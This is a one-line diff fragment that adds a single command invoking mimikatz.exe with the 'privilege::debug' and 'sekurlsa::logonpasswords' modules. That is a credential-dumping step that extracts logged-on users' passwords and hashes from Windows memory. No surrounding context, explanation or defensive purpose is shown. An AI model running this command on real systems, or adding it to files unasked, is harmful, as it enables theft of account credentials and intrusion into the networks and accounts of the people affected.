@@ -1,0 +1,1 @@
+.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
